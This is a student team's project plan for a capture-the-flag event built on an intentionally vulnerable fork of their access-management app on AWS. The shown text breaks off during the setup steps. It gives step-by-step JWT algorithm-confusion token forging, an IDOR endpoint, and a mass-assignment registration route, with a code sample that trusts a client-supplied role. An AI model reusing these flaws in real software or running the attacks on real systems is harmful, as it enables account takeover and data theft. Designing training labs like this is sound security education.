# SecureGate CTF — Project Plan

> [!abstract] What Is This Event?
> SecureGate CTF is a **Capture The Flag competition** built on top of the SecureGate PAM infrastructure. A specially deployed, **intentionally vulnerable** fork of the PAM system is hosted on AWS and handed to ~20–24 classmates as a black-box target. Players must work through four escalating stages — reconnaissance, web exploitation, privilege escalation, and database flag retrieval — using real-world attack techniques against real running infrastructure.
>
> **Real vulnerabilities. Real AWS infrastructure. Real flags. No simulation.**

---

## Table of Contents

- [[#1. The Big Picture]]
- [[#2. What Makes This a Real CTF]]
- [[#3. AWS Infrastructure — Full Architecture]]
- [[#4. Team Structure & Domain Ownership]]
- [[#5. The Four Challenge Stages]]
- [[#6. Repository & Directory Layout]]
- [[#7. The Technology Stack]]
- [[#8. Project Phases — Overview]]
- [[#9. Phase 0 — AWS Bootstrap & Network Design (Day 1, All Members)]]
- [[#10. Phase 1 — CTF PAM Fork & Vulnerability Injection (Member 2)]]
- [[#11. Phase 2 — Flag Database & MySQL EC2 (Member 3)]]
- [[#12. Phase 3 — Lore Page, Leaderboard & Nginx EC2 (Member 1)]]
- [[#13. Phase 4 — Onboarding Pipeline & Participant Accounts (Member 2)]]
- [[#14. Phase 5 — Hardening, Isolation & Security Groups (Member 3)]]
- [[#15. Phase 6 — Integration Testing & Attack Walkthroughs (All)]]
- [[#16. Full Attack Chain — Step by Step]]
- [[#17. Vulnerability Design Explained]]
- [[#18. Leaderboard & Scoring System]]
- [[#19. EC2 Instance Reference]]
- [[#20. Security Boundaries — What Is Intentional vs What Must Be Protected]]
- [[#21. Event Day Operations]]
- [[#22. Timeline & Task Breakdown]]

---

## 1. The Big Picture

### What Problem Are We Solving?

University CTFs are typically toy environments — a Docker container on a laptop, a pre-built challenge image with an obvious hint, flags hidden behind puzzles that look nothing like real attacks. Students solve them and learn abstract techniques that feel disconnected from actual professional security work.

SecureGate CTF solves this by using the **real PAM system** we built as the attack surface. Players face:

- A real Next.js application running on a real EC2 instance
- A real JWT authentication system that has a real cryptographic vulnerability
- A real RBAC system with a real broken access control flaw
- A real MySQL database on a separate EC2 instance holding the flag

The attack techniques — certificate transparency recon, HTTP header disclosure, JWT algorithm confusion, IDOR, mass assignment, and privilege escalation — are all documented in real CVEs, real bug bounty reports, and real penetration testing frameworks. A student who solves this CTF has practiced the same class of attacks that professional red teamers run on enterprise systems every week.

### The Core Concept

```
WITHOUT SecureGate CTF:
  Student → solves contrived puzzle → gets flag → learns trick
  Student leaves with nothing that transfers to professional work

WITH SecureGate CTF:
  Player → recons a live web application → finds a JWT vulnerability
         → forges admin token → exploits broken access control
         → retrieves database flag → leaves knowing how PAM systems fail
```

### Why Four Stages?

Each stage filters players by skill and teaches a distinct lesson:

| Stage | Name | Skill Tested | Real-World Equivalent |
|---|---|---|---|
| 1 | Recon | OSINT, HTTP analysis | Bug bounty recon phase |
| 2 | Web Exploitation | JWT attacks or IDOR | Enterprise SSO bypass |
| 3 | Privilege Escalation | Broken access control | Lateral movement in web apps |
| 4 | Flag Retrieval | DB access via PAM session | Data exfiltration through a proxy |

The stages are **sequential** — you cannot jump to Stage 4 without completing Stage 3. This is enforced by the system itself, not by the honour system.

---

## 2. What Makes This a Real CTF

### The Lore

Players do not receive a plain challenge description. They receive a **scenario**:

> *"A fictional company called APT Solutions has deployed an internal Privileged Access Management portal to protect access to their employee database. An anonymous tip has suggested the portal has critical vulnerabilities. Your team has been contracted as external penetration testers. Exfiltrate the flag from the employee database to confirm the breach scope."*

The lore page — served by a static Nginx EC2 — gives the company backstory, a fake "terms of engagement" document, and the single starting URL: `http://ctf-pam.duckdns.org`. Everything else must be discovered.

### What Players Are Given

At the start of the event, every player receives exactly:

- Their SecureGate login credentials (email + password, via a themed email)
- The URL: `http://ctf-pam.duckdns.org`
- The lore page URL: `http://apt-lore.duckdns.org`
- A Discord server invite for questions and first-blood announcements

Nothing else. No source code. No hints. No Swagger docs. The application behaves exactly as it would in a real penetration test engagement.

### What Players Must Figure Out

Everything else is discovered through the attack chain:

- That a JWKS endpoint exists at `/.well-known/jwks.json` (standard JWT discovery)
- That the server leaks its framework version in HTTP headers
- That the user creation endpoint accepts a `role` field it should not trust
- That the audit log endpoint lacks per-user filtering enforcement in one specific query path
- The structure of the flag table in the MySQL database

---

## 3. AWS Infrastructure — Full Architecture

### Overview

The CTF runs on **four EC2 instances** in the same AWS VPC. Three are purpose-built for the CTF. The fourth is the existing SecureGate production PAM instance — it is completely isolated from all CTF infrastructure and must never be touched during the event.

```
┌─────────────────────────────────────────────────────────────────────┐
│                          AWS VPC (us-east-1)                        │
│                                                                     │
│  ┌─────────────────┐     ┌─────────────────┐                       │
│  │  CTF-PAM EC2    │     │  CTF-MySQL EC2  │                       │
│  │  (t2.micro)     │────►│  (t2.micro)     │                       │
│  │  Public IP      │     │  Private IP     │                       │
│  │  Port 80/443    │     │  Port 22 only   │                       │
│  │  Port 3000      │     │  (from CTF-PAM) │                       │
│  └─────────────────┘     └─────────────────┘                       │
│           │                                                         │
│  ┌─────────────────┐     ┌─────────────────────────────────────┐  │
│  │  Lore-Nginx EC2 │     │  SecureGate Production PAM EC2      │  │
│  │  (t2.micro)     │     │  (EXISTING — DO NOT TOUCH)          │  │
│  │  Public IP      │     │  Completely separate Security Group  │  │
│  │  Port 80 only   │     │  No peering with CTF instances      │  │
│  └─────────────────┘     └─────────────────────────────────────┘  │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### EC2 Instance Definitions

#### Instance 1 — CTF-PAM EC2

This is the primary attack surface. Players interact with this machine exclusively through their browser.

| Property | Value |
|---|---|
| **Instance type** | t2.micro (1 vCPU, 1 GB RAM) |
| **AMI** | Ubuntu 22.04 LTS |
| **Region** | us-east-1 |
| **Public IP** | Dynamic (updated by DuckDNS cron job on boot) |
| **DuckDNS subdomain** | `ctf-pam.duckdns.org` |
| **Elastic IP** | Not allocated — DuckDNS compensates |
| **Inbound rules** | Port 22 (SSH, team IPs only), Port 80 (0.0.0.0/0), Port 443 (0.0.0.0/0) |
| **Outbound rules** | All traffic (needed to reach CTF-MySQL on private IP) |
| **Storage** | 20 GB gp3 EBS |
| **Software** | Docker, Docker Compose, Nginx (host-installed), Certbot, Node.js 20 |

What runs on it:
- The vulnerable SecureGate PAM fork (Docker Compose: app + postgres + redis + mongo)
- Nginx reverse proxy (port 80/443 → localhost:3000)
- DuckDNS update cron job

#### Instance 2 — CTF-MySQL EC2

This holds the flag. Players never interact with it directly — they reach it only through a PAM session after completing Stages 1–3. It has no public IP.

| Property | Value |
|---|---|
| **Instance type** | t2.micro (1 vCPU, 1 GB RAM) |
| **AMI** | Ubuntu 22.04 LTS |
| **Region** | us-east-1 |
| **Public IP** | None — private VPC IP only |
| **Private IP** | Static, assigned at launch (e.g. `10.0.1.50`) |
| **Inbound rules** | Port 22 (SSH, from CTF-PAM private IP only), Port 3306 (MySQL, from CTF-PAM private IP only) |
| **Outbound rules** | None (fully locked) |
| **Storage** | 8 GB gp3 EBS |
| **Software** | MySQL 8.0, OpenSSH, pamuser account |

What runs on it:
- MySQL 8.0 with the flag database
- A `pamuser` account (the SSH user the CTF PAM authenticates as)
- Decoy tables and fake employee data around the real flag

#### Instance 3 — Lore-Nginx EC2

A static web server serving the CTF narrative. Players visit this first to get context and the starting URL. It deliberately leaks one piece of information in its HTTP headers (a specific custom header) that gives players the first foothold for Stage 1.

| Property | Value |
|---|---|
| **Instance type** | t2.micro (1 vCPU, 1 GB RAM) |
| **AMI** | Ubuntu 22.04 LTS |
| **Region** | us-east-1 |
| **Public IP** | Dynamic (DuckDNS) |
| **DuckDNS subdomain** | `apt-lore.duckdns.org` |
| **Inbound rules** | Port 22 (SSH, team IPs only), Port 80 (0.0.0.0/0) |
| **Outbound rules** | All traffic |
| **Storage** | 8 GB gp3 EBS |
| **Software** | Nginx (host-installed), static HTML/CSS |

#### Instance 4 — Production SecureGate PAM EC2 (Existing)

This is the existing demo PAM at `securepamgate.duckdns.org`. It is listed here only to make the isolation requirement explicit.

> [!danger] HARD RULE — Zero Contact
> The CTF infrastructure has **zero network path to the Production EC2**. They are in separate Security Groups with no cross-group rules. No shared secrets. No shared databases. If the CTF PAM is compromised by a player going beyond the intended attack chain, it cannot pivot to the Production EC2 under any circumstances.

### VPC & Subnet Design

```
VPC: 10.0.0.0/16

Public Subnet:  10.0.0.0/24
  ├── CTF-PAM EC2       (gets public IP via Internet Gateway)
  └── Lore-Nginx EC2    (gets public IP via Internet Gateway)

Private Subnet: 10.0.1.0/24
  └── CTF-MySQL EC2     (no public IP, no Internet Gateway route)

Internet Gateway: attached to VPC, routes traffic for Public Subnet only
NAT Gateway: NOT required (private subnet instances need no outbound internet)
```

### Security Group Rules (Complete)

#### SG-CTF-PAM

| Direction | Protocol | Port | Source/Destination | Reason |
|---|---|---|---|---|
| Inbound | TCP | 22 | Team static IPs only | SSH management |
| Inbound | TCP | 80 | 0.0.0.0/0 | HTTP (players) |
| Inbound | TCP | 443 | 0.0.0.0/0 | HTTPS (players) |
| Outbound | TCP | 22 | SG-CTF-MySQL | PAM→MySQL SSH tunnel |
| Outbound | TCP | 3306 | SG-CTF-MySQL | PAM→MySQL direct (optional) |
| Outbound | All | All | 0.0.0.0/0 | Internet for package installs |

#### SG-CTF-MySQL

| Direction | Protocol | Port | Source/Destination | Reason |
|---|---|---|---|---|
| Inbound | TCP | 22 | SG-CTF-PAM | PAM tunnels in via SSH |
| Inbound | TCP | 3306 | SG-CTF-PAM | Direct MySQL (if needed) |
| Outbound | None | None | — | Fully locked — no egress |

#### SG-Lore-Nginx

| Direction | Protocol | Port | Source/Destination | Reason |
|---|---|---|---|---|
| Inbound | TCP | 22 | Team static IPs only | SSH management |
| Inbound | TCP | 80 | 0.0.0.0/0 | HTTP (players) |
| Outbound | All | All | 0.0.0.0/0 | Package installs only |

### DuckDNS Cron Job (Both Public EC2s)

Both CTF-PAM and Lore-Nginx run this cron job to keep their DuckDNS records current if the instance restarts:

```bash
# /etc/cron.d/duckdns  — runs every 5 minutes
*/5 * * * * root curl -s "https://www.duckdns.org/update?domains=<subdomain>&token=<token>&ip=" > /var/log/duckdns.log 2>&1
```

A systemd service variant that also runs on boot:

```bash
# /etc/systemd/system/duckdns.service
[Unit]
Description=DuckDNS IP Update
After=network-online.target

[Service]
Type=oneshot
ExecStart=/usr/local/bin/duckdns-update.sh

[Install]
WantedBy=multi-user.target
```

### AWS Cost Estimate (Before November)

With $100 in credits and a target end date in November, the budget is generous. Approximate monthly costs for four t2.micro instances in us-east-1:

| Resource | Monthly Cost (approx) |
|---|---|
| 3× t2.micro EC2 (CTF instances) | ~$10.50 |
| 1× t2.micro EC2 (existing Production) | ~$3.50 |
| EBS storage (4 volumes ~50 GB total) | ~$4.00 |
| Data transfer out (light CTF traffic) | ~$1.00 |
| **Total / month** | **~$19.00** |

At $19/month, $100 in credits covers roughly **5 months** (June → October), well within the November target. Keep instances running continuously — stopping and starting them wastes time and changes public IPs. The DuckDNS cron handles IP changes on restarts but it is always better to keep them live.

---

## 4. Team Structure & Domain Ownership

### The Three Domains

```
┌──────────────────────────────────────────────────────────────────────────────┐
│                         SecureGate CTF Domains                               │
│                                                                              │
│  ┌──────────────────────┐  ┌──────────────────────┐  ┌──────────────────┐   │
│  │     MEMBER 1         │  │     MEMBER 2         │  │    MEMBER 3      │   │
│  │  Lore, UX & Discord  │  │  CTF PAM Fork &      │  │  Flag DB, MySQL  │   │
│  │                      │  │  Vulnerability Eng.  │  │  EC2 & Hardening │   │
│  │                      │  │                      │  │                  │   │
│  │  Lore-Nginx EC2      │  │  CTF-PAM EC2 (app)   │  │  CTF-MySQL EC2   │   │
│  │  /ctf-lore/ (HTML)   │  │  /ctf-pam/ (repo)    │  │  MySQL schema    │   │
│  │                      │  │                      │  │  Flag table      │   │
│  │  • Lore page HTML    │  │  • Vulnerable PAM    │  │  • pamuser acct  │   │
│  │  • APT company story │  │    fork (injected    │  │  • Decoy data    │   │
│  │  • Leaderboard UI    │  │    vulns)            │  │  • Security      │   │
│  │  • Discord setup     │  │  • JWKS endpoint     │  │    groups        │   │
│  │  • Participant       │  │  • Broken RBAC       │  │  • SSH key pair  │   │
│  │    comms             │  │  • Mass assignment   │  │    for PAM auth  │   │
│  │  • Google Form       │  │  • Header leakage    │  │  • VPC subnet    │   │
│  │  • Credential        │  │  • Onboarding bulk   │  │    design        │   │
│  │    email template    │  │    script            │  │  • Backups and   │   │
│  │                      │  │  • Score API         │  │    snapshots     │   │
│  └──────────────────────┘  └──────────────────────┘  └──────────────────┘   │
│                                                                              │
└──────────────────────────────────────────────────────────────────────────────┘
```

### Domain Boundaries Are Absolute

> [!warning] One Member, One Domain
> Member 3 does not touch the CTF PAM codebase. Member 2 does not touch the MySQL EC2. Member 1 does not touch Security Groups. Cross-domain work requires a team discussion and explicit agreement. This is not bureaucracy — it prevents two people making conflicting changes to live infrastructure during the event.

### Interaction Points

There are exactly three places where domains meet:

**Point A — Member 2 ↔ Member 3: SSH Credential Contract**
The CTF PAM (Member 2) needs SSH credentials to tunnel into the CTF MySQL EC2 (Member 3). Member 3 creates the `pamuser` account and generates an ed25519 key pair. Member 3 provides Member 2 with the private key to seal into the vault. Member 2 does not configure anything on the MySQL EC2 directly.

**Point B — Member 2 → Member 1: Score API Specification**
The CTF PAM emits a score event to MongoDB whenever a flag is submitted correctly. Member 1's leaderboard page reads from MongoDB. The schema for the score document is agreed between Members 1 and 2 before either starts coding. Member 2 writes the score events; Member 1 reads them.

**Point C — Member 1 ↔ Member 3: Lore Page IP Reference**
The lore page (Member 1) must link to `http://ctf-pam.duckdns.org`. When the CTF-PAM EC2 gets its IP configured (Member 3's responsibility), Member 3 tells Member 1 the final DuckDNS subdomain. Member 1 hardcodes it into the lore page.

---

## 5. The Four Challenge Stages

### Stage 1 — Recon

**What players must find:** The target application's technology stack and a hidden endpoint path.

**Vulnerability class:** Information disclosure via HTTP response headers and certificate transparency logs.

**How it works:**

The CTF PAM is configured to leak two pieces of information:

1. **HTTP `X-Powered-By` header** — The Nginx configuration deliberately does NOT strip the `X-Powered-By: Next.js` header that Node.js adds. Players who inspect the response headers with `curl -I` or browser dev tools see the framework immediately.

2. **`Server` header** — Nginx is configured to reveal `nginx/1.24.0` rather than suppressing the version. This is a deliberate disclosure; in real hardening you would suppress this.

3. **Certificate Transparency (CT) logs** — Even though HTTPS is configured via Let's Encrypt, CT logs are public. Players who search `crt.sh` for `duckdns.org` certificates will find `ctf-pam.duckdns.org` listed, confirming the target domain and the certificate authority used. This teaches players that CT logs are a real recon resource, not a CTF-specific trick.

**The flag for Stage 1:** There is no traditional flag for Stage 1. Completing Stage 1 means the player has enough information to attempt Stage 2. The "proof of Stage 1 completion" is the act of using the discovered endpoint in Stage 2. This mirrors real penetration testing: recon does not produce a deliverable, it enables the next action.

**What players learn:** HTTP headers leak framework and server information; CT logs reveal infrastructure even before you visit it; manual header inspection is a fundamental skill.

---

### Stage 2 — Web Exploitation

**What players must find:** A valid JWT access token with the `ADMIN` role.

**Two possible attack paths (either works):**

#### Path A — JWT Algorithm Confusion (RS256 → HS256)

**What the vulnerability is:**

The CTF PAM uses RS256 JWT tokens. The public key is available at `/.well-known/jwks.json` (this endpoint exists in the real SecureGate code and is intentionally left open). In a correctly implemented RS256 system, the server only accepts tokens signed with the private key, verified with the public key.

The vulnerability: the CTF PAM's `verifyAccessToken` function is modified to accept **both RS256 and HS256** without explicitly rejecting the algorithm field in the token header.

```
Normal RS256 flow:
  Client gets token signed with PRIVATE KEY
  Server verifies with PUBLIC KEY
  Attacker has no private key → cannot forge

Algorithm confusion attack:
  Attacker takes the PUBLIC KEY (freely available at /jwks.json)
  Attacker signs a new token with HS256, using the PUBLIC KEY as the HMAC secret
  Vulnerable server accepts HS256 tokens → tries to verify with "the key"
  The "key" it has is the public key → same bytes the attacker used
  Verification passes → forged admin token accepted
```

**The injected vulnerability (modification to `lib/auth.ts`):**

The original `verifyAccessToken` in the real SecureGate uses `importSPKI` and explicitly passes `"RS256"` to `jwtVerify`. The CTF version replaces this with a version that passes the raw key bytes and allows the algorithm to be taken from the token header — making it susceptible to algorithm confusion.

**Player steps:**

1. Log in with their valid (OPERATOR) credentials → get a legitimate RS256 token
2. Decode the token with `jwt.io` or Python → see the payload: `{ role: "OPERATOR", ... }`
3. Visit `/.well-known/jwks.json` → extract the RSA public key
4. Convert the public key to PEM format
5. Craft a new JWT with `{ alg: "HS256" }` in the header and `{ role: "ADMIN", ... }` in the payload
6. Sign it using the RSA public key bytes as the HMAC-SHA256 secret
7. Send API requests with the forged token → server accepts it → ADMIN access granted

Tools players can use: `python-jwt`, `PyJWT`, `jwt_tool`, or any JWT library.

#### Path B — IDOR on Audit Log Endpoint

**What the vulnerability is:**

The real SecureGate audit sessions endpoint correctly filters by `userId` for OPERATOR role:

```javascript
const filter = auth.role === "OPERATOR" ? { userId: auth.userId } : {};
```

The CTF version introduces an IDOR: a second endpoint path `/api/audit/sessions/user/<userId>` is added where the `userId` in the URL is taken directly without verifying it matches the authenticated user. An OPERATOR can enumerate other users' session IDs by changing the `userId` parameter.

This path alone does not give admin access but gives players session data that contains the admin's `userId`, which they can use to further probe the system. Combined with the mass assignment in Stage 3, it creates a complete exploitation chain.

**What players learn (either path):** JWT algorithm confusion is a real and documented attack (CVE class: CWE-327); IDOR is the #4 vulnerability in OWASP API Top 10; public key material is not "safe to expose" if the server is not algorithm-strict.

---

### Stage 3 — Privilege Escalation

**What players must find:** An active session with access to the MySQL asset (which only the ADMIN role has a policy for).

**Vulnerability class:** Mass assignment / broken access control on user creation endpoint.

**What the vulnerability is:**

The real SecureGate `POST /api/users/admin` endpoint is protected by `requireRole(request, ["ADMIN"])` — only an ADMIN can create users. The CTF version introduces a second, unauthenticated (or OPERATOR-accessible) registration endpoint at `POST /api/register` that was "left open during development."

The endpoint accepts a JSON body: `{ email, password, role }`. The `role` field is supposed to default to `OPERATOR` and ignore whatever the client sends. The CTF version trusts the `role` field from the request body directly:

```javascript
// VULNERABLE version in the CTF fork — role taken directly from body
const { email, password, role } = body;
// ... no validation that role is only 'OPERATOR' ...
const passwordHash = await bcrypt.hash(password, 12);
await pool.query(
  `INSERT INTO users (email, password_hash) VALUES ($1, $2)`,
  [email, passwordHash]
);
await pool.query(
  `INSERT INTO user_roles (user_id, role_id)
   SELECT $1, r.id FROM roles r WHERE r.name = $2`,
  [newUserId, role]   // ← role comes from attacker-controlled input
);
```

A player who discovers this endpoint can register a new account with `"role": "ADMIN"`, log in with their new account, and receive a legitimate JWT with the ADMIN role — no algorithm confusion needed for Stage 3 onward (though both paths arrive at the same place).

**Player steps:**

1. Discover `/api/register` (through directory fuzzing with `ffuf`, `gobuster`, or inspecting the lore page's hint text)
2. Send `POST /api/register` with `{ "email": "attacker@evil.com", "password": "p@ssw0rd", "role": "ADMIN" }`
3. Log in with the new credentials → receive a real ADMIN JWT
4. Call `GET /api/assets` → see the `Corp MySQL Server` asset (only visible to ADMIN/OPERATOR with policy)
5. Call `POST /api/sessions/request` with the MySQL asset ID → receive a JIT ticket
6. Open the terminal at `/terminal?ticket=<uuid>` → SSH tunnel established to CTF-MySQL EC2

**What players learn:** Mass assignment is OWASP API Top 10 #3; never trust client-supplied role/permission fields; registration endpoints are a common forgotten attack surface; privilege escalation through account creation is a documented attack pattern in real bug bounty programs.

---

### Stage 4 — Flag Retrieval

**What players must find:** The flag string inside the MySQL database.

**How it works:**

Once inside the terminal (via Stage 3), players land in a MySQL shell (the PAM auto-logs into MySQL as it does in the real system). They see multiple databases and tables. The flag is in one specific table amid convincing decoy data:

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| employees          |
| hr_archive         |
| financial_records  |
| secret_ops         |
+--------------------+

mysql> use secret_ops;
mysql> show tables;
+----------------------+
| Tables_in_secret_ops |
+----------------------+
| project_codenames    |
| access_tokens        |
| flag                 |  ← this one
+----------------------+

mysql> select * from flag;
+----+------------------------------------------+
| id | value                                    |
+----+------------------------------------------+
|  1 | CTF{jwt_alg_confusion_pam_pwned_2025}    |
+----+------------------------------------------+
```

The flag format: `CTF{<descriptive_string>}`. The string describes the primary vulnerability used, so even the flag itself is educational.

**Decoy tables** in `employees` and `hr_archive` contain realistic fake data (generated names, salary figures, fake SSNs) to make players work to find the right database rather than immediately landing on the flag.

**Flag submission:** Players submit the flag string through the leaderboard page at `http://apt-lore.duckdns.org/submit`. The submission endpoint verifies the flag, records the timestamp, awards points, and updates the leaderboard.

**What players learn:** Database enumeration; how a PAM system that is compromised still exposes the underlying data; why defence in depth (encrypting data at rest, column-level encryption) matters even when the PAM layer is breached.

---

## 6. Repository & Directory Layout

Two separate repositories. The CTF infrastructure is **never** mixed with the production SecureGate repository.

### Repository 1 — `ctf-pam` (Member 2 owns, all members can read)

This is the intentionally vulnerable fork of SecureGate. It is a **private GitHub repository** — never made public, not even after the event, because it contains live AWS credential-adjacent configuration and intentional vulnerabilities that should not be shared freely.

```
/ctf-pam                              ← Root of the vulnerable PAM fork
│
├── server.ts                         ← Same as production (no changes needed)
│
├── /app
│   ├── /api
│   │   ├── /auth
│   │   │   ├── login/route.ts        ← MODIFIED: logs failed attempts to MongoDB
│   │   │   └── refresh/route.ts      ← unchanged
│   │   ├── /register
│   │   │   └── route.ts              ← NEW: unauthenticated registration (VULNERABLE)
│   │   ├── /assets
│   │   │   └── route.ts              ← unchanged
│   │   ├── /sessions
│   │   │   ├── request/route.ts      ← unchanged
│   │   │   └── [id]/route.ts         ← unchanged
│   │   ├── /audit
│   │   │   ├── sessions/route.ts     ← unchanged
│   │   │   ├── sessions/[id]/events  ← unchanged
│   │   │   └── sessions/user/[uid]   ← NEW: IDOR endpoint (VULNERABLE)
│   │   ├── /.well-known
│   │   │   └── jwks.json/route.ts    ← NEW: exposes RSA public key (intentional)
│   │   └── /ctf
│   │       └── submit/route.ts       ← NEW: flag submission handler
│   │
│   ├── /login                        ← unchanged
│   ├── /dashboard                    ← unchanged
│   ├── /terminal                     ← unchanged
│   └── /replay                       ← unchanged
│
├── /lib
│   ├── auth.ts                       ← MODIFIED: algorithm confusion vulnerability injected
│   ├── rbac.ts                       ← unchanged
│   ├── db.ts                         ← unchanged
│   ├── redis.ts                      ← unchanged
│   ├── mongo.ts                      ← unchanged
│   ├── audit.service.ts              ← unchanged
│   └── /vault
│       ├── vault.service.ts          ← unchanged
│       └── tunnel.service.ts         ← MODIFIED: connects to CTF-MySQL EC2 private IP
│
├── /docker
│   ├── /postgres
│   │   ├── init.sql                  ← unchanged
│   │   └── seed.sql                  ← MODIFIED: CTF participant accounts seeded here
│   └── seed-vault.ts                 ← MODIFIED: CTF-MySQL EC2 SSH creds
│
├── docker-compose.yml                ← unchanged (same four services)
├── .env                              ← MODIFIED: CTF-MySQL private IP as target host
├── next.config.ts                    ← MODIFIED: no allowedDevOrigins, add header config
└── README.md                         ← CTF operator notes only (not public)
```

### Repository 2 — `ctf-lore` (Member 1 owns, all members can read)

Static HTML/CSS site served by Nginx on the Lore EC2. No build process — pure static files deployed by `rsync` or `scp`.

```
/ctf-lore                             ← Root of the lore site
│
├── /public
│   ├── index.html                    ← Lore landing page (APT Solutions narrative)
│   ├── engagement.html               ← Fake "terms of engagement" document
│   ├── leaderboard.html              ← Live leaderboard (polls /api/scores)
│   ├── submit.html                   ← Flag submission form
│   └── /assets
│       ├── style.css                 ← Dark terminal aesthetic CSS
│       ├── logo.svg                  ← APT Solutions fake company logo
│       └── leaderboard.js            ← Polls score API every 10 seconds
│
├── /nginx
│   └── apt-lore.conf                 ← Nginx config for this site
│       │                                Includes the deliberate header leak:
│       │                                add_header X-Challenge-Platform "SecureGate-PAM";
│       └── (this header is Stage 1's starting breadcrumb)
│
└── deploy.sh                         ← rsync to Lore EC2 over SSH
```

### Repository 3 — `ctf-ops` (All members, private)

Operational scripts used during setup and the event itself. Not deployed anywhere — lives on team members' machines.

```
/ctf-ops                              ← Operator tooling
│
├── /onboarding
│   ├── participants.csv              ← Name, email, assigned credentials
│   ├── bulk-create-users.ts          ← Calls CTF PAM API to create accounts
│   ├── email-template.html           ← Themed credential delivery email
│   └── send-emails.ts               ← Sends credential emails via SMTP
│
├── /monitoring
│   ├── check-health.sh               ← Curls all three EC2s and reports status
│   ├── tail-logs.sh                  ← SSH into CTF-PAM and tails Docker logs
│   └── redis-monitor.sh              ← Watches Redis for active sessions during event
│
├── /nuclear
│   ├── reset-ctf.sh                  ← Full reset: wipe all sessions + scores
│   ├── ban-ip.sh                     ← Add IP to Nginx deny list (for abuse)
│   └── extend-session-ttl.sh        ← For debugging — manually extend a session
│
└── /docs
    ├── attack-walkthrough.md         ← Complete solution (team eyes only)
    └── infrastructure-notes.md      ← IP addresses, passwords, key paths
```

---

## 7. The Technology Stack

### What Changes vs Production SecureGate

The CTF PAM is a fork, not a rewrite. Approximately 90% of the code is identical to the production PAM. Only specific, targeted changes are made to inject vulnerabilities and add CTF-specific features.

| Component | Production PAM | CTF PAM | Change |
|---|---|---|---|
| Next.js app | Same | Same | No change |
| `lib/auth.ts` | Strict RS256 only | Accepts HS256 via algorithm confusion | **MODIFIED** |
| `/app/api/register` | Does not exist | Unauthenticated endpoint with mass assignment | **NEW** |
| `/.well-known/jwks.json` | Does not exist | Exposes RSA public key | **NEW** |
| `/app/api/audit/sessions/user/[uid]` | Does not exist | IDOR endpoint | **NEW** |
| `/app/api/ctf/submit` | Does not exist | Flag submission + score recording | **NEW** |
| `Nginx config` | Strips `X-Powered-By` | Leaves `X-Powered-By` intact | **MODIFIED** |
| `GUARDIAN_TARGET_HOST` | Production MySQL EC2 private IP | CTF-MySQL EC2 private IP | **MODIFIED** |
| Vault seed | Production SSH creds | CTF-MySQL pamuser SSH creds | **MODIFIED** |
| PostgreSQL seed | 3 demo users | 20–24 participant accounts | **MODIFIED** |

### Leaderboard Tech Stack

The leaderboard is a static HTML page that polls a lightweight API endpoint. The API is served by the CTF PAM itself (one more route in the same Next.js app) and reads from MongoDB.

```
Player submits flag
        │
        ▼
POST /api/ctf/submit { flag, participantEmail }
        │
        ├── Verify flag string matches expected value
        ├── Check participant has not already submitted (idempotent)
        ├── Record to MongoDB: { email, timestamp, stage, points }
        └── Return { success: true, message: "Flag accepted!" }

Leaderboard page (apt-lore.duckdns.org/leaderboard.html)
        │
        └── Every 10 seconds: GET /api/ctf/scores
                │
                └── MongoDB aggregate → sorted by points DESC, then timestamp ASC
                    Returns [{ email, points, solvedAt }]
                    Page renders table with live updates
```

**Score protection:** The submit endpoint requires a `X-CTF-Submit-Key` header with a value known only to the team and embedded in the submit form. This prevents players from directly hitting the API with arbitrary flag strings and avoids brute-force flag submission. The key is a random 32-byte hex string generated at setup and hardcoded in both the form and the server.

---

## 8. Project Phases — Overview

```mermaid
timeline
    title CTF Implementation Timeline
    Week 0 : Phase 0
           : AWS Bootstrap
           : All members
    Week 1 : Phase 1
           : CTF PAM Fork
           : Member 2
    Week 1–2 : Phase 2
             : MySQL EC2 & Flag DB
             : Member 3
    Week 2 : Phase 3
           : Lore Page & Leaderboard
           : Member 1
    Week 2 : Phase 4
           : Onboarding Pipeline
           : Member 2
    Week 2–3 : Phase 5
             : Hardening & Isolation
             : Member 3
    Week 3 : Phase 6
           : Full Integration & Attack Testing
           : All members
```

| Phase | Name | Owner | Output |
|---|---|---|---|
| 0 | AWS Bootstrap | All | VPC, subnets, Security Groups, all four EC2s running, DuckDNS configured |
| 1 | CTF PAM Fork | Member 2 | Vulnerable PAM running on CTF-PAM EC2, all four vulnerabilities injected and verified |
| 2 | MySQL EC2 & Flag DB | Member 3 | CTF-MySQL EC2 configured, flag table seeded, pamuser SSH access working |
| 3 | Lore Page & Leaderboard | Member 1 | Static site live at `apt-lore.duckdns.org`, leaderboard polling, flag submission working |
| 4 | Onboarding Pipeline | Member 2 | Bulk account creation script, credential email template, 24 test accounts created |
| 5 | Hardening & Isolation | Member 3 | Security Groups locked, CTF-MySQL unreachable from internet, Production PAM isolated |
| 6 | Integration & Attack Test | All | Full attack chain validated end-to-end by team members playing as participants |

---

## 9. Phase 0 — AWS Bootstrap (Day 1, All Members)

### Purpose

Before any code is written, all infrastructure must exist. Phase 0 is the only phase where all three members work together. The goal: end the day with four EC2 instances running, all reachable via SSH from team IPs, DuckDNS subdomains resolving, and Security Groups in their initial configuration (to be tightened in Phase 5).

### Step-by-Step AWS Setup

**Step 1 — Create the VPC**

In AWS Console → VPC → Create VPC:
- Name: `securegate-ctf-vpc`
- IPv4 CIDR: `10.0.0.0/16`
- No IPv6
- Tenancy: Default

**Step 2 — Create Subnets**

Create two subnets inside the VPC:

Public Subnet:
- Name: `ctf-public-subnet`
- Availability Zone: `us-east-1a`
- CIDR: `10.0.0.0/24`

Private Subnet:
- Name: `ctf-private-subnet`
- Availability Zone: `us-east-1a`
- CIDR: `10.0.1.0/24`

**Step 3 — Internet Gateway**

Create an Internet Gateway named `ctf-igw`. Attach it to `securegate-ctf-vpc`.

In the Route Table for the Public Subnet:
- Add route: `0.0.0.0/0` → `ctf-igw`

The Private Subnet gets no route to the Internet Gateway. The CTF-MySQL EC2 has no internet access — by design.

**Step 4 — Create Security Groups**

Create three Security Groups (initial, permissive — tightened in Phase 5):

`SG-CTF-PAM`:
- Inbound: Port 22 from team member home IPs (each team member adds their own IP)
- Inbound: Port 80 from 0.0.0.0/0
- Inbound: Port 443 from 0.0.0.0/0
- Outbound: All traffic

`SG-CTF-MySQL`:
- Inbound: Port 22 from `SG-CTF-PAM` (not an IP — reference the Security Group itself)
- Inbound: Port 3306 from `SG-CTF-PAM`
- Outbound: None (explicitly remove the default all-outbound rule)

`SG-Lore-Nginx`:
- Inbound: Port 22 from team member home IPs
